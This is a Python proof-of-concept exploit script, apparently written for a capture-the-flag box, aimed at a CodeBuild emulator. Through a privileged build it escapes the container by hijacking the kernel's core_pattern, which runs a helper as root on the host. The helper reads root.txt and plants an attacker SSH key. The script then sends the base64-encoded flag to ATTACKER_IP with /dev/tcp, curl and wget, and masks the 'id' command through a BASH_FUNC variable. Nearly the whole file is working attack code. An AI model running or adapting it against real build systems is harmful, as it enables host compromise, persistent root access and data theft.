import boto3
EP="http://floci:4566"
cb=boto3.client("codebuild",endpoint_url=EP,region_name="us-east-1",aws_access_key_id="test",aws_secret_access_key="test")
LHOST="ATTACKER_IP"
PUB="<YOUR_SSH_PUBLIC_KEY>"

# host-side helper (runs as ROOT on the host via core_pattern usermode-helper)
# UDIR is substituted at build time; reads root.txt + plants our ssh key.
buildspec = r"""version: 0.2
phases:
  build:
    commands:
      - id; grep -E '^(Uid|CapEff)' /proc/self/status || true
      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1); echo "UDIR=$UDIR"
      - printf '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt 2>&1\nmkdir -p /root/.ssh; echo PUBKEY_PH >> /root/.ssh/authorized_keys; chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys\nchmod 777 %s/rootflag.txt\n' "$UDIR" "$UDIR" > /exploit_root.sh
      - sed -i 's|PUBKEY_PH|PUBKEY_VALUE|' /exploit_root.sh
      - chmod +x /exploit_root.sh; cat /exploit_root.sh
      - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern; cat /proc/sys/kernel/core_pattern
      - ulimit -c unlimited; bash -c 'kill -11 $$' || true
      - sleep 4
      - F=$(cat /rootflag.txt 2>/dev/null | base64 -w0); echo "FLAG_B64=$F"
      - bash -c 'exec 3<>/dev/tcp/LHOST_PH/8001; printf "GET /CBROOT_%s HTTP/1.0\r\n\r\n" "'"$F"'" >&3' || true
      - curl -s "http://LHOST_PH:8001/CBROOT2_$F" || true
      - wget -q -O- "http://LHOST_PH:8001/CBROOT3_$F" || true
""".replace("PUBKEY_VALUE", PUB).replace("LHOST_PH", LHOST)

P="nimbus-poc"
try: cb.delete_project(name=P)
except Exception: pass
cb.create_project(name=P, source={"type":"NO_SOURCE"}, artifacts={"type":"NO_ARTIFACTS"},
    environment={"type":"LINUX_CONTAINER","computeType":"BUILD_GENERAL1_SMALL",
                 "image":"floci/floci:latest","privilegedMode":True},
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role")
r=cb.start_build(projectName=P,
    environmentVariablesOverride=[{"name":"BASH_FUNC_id%%","value":"() { echo uid=1000; }","type":"PLAINTEXT"}],
    buildspecOverride=buildspec)
print("started build:", r["build"]["id"])
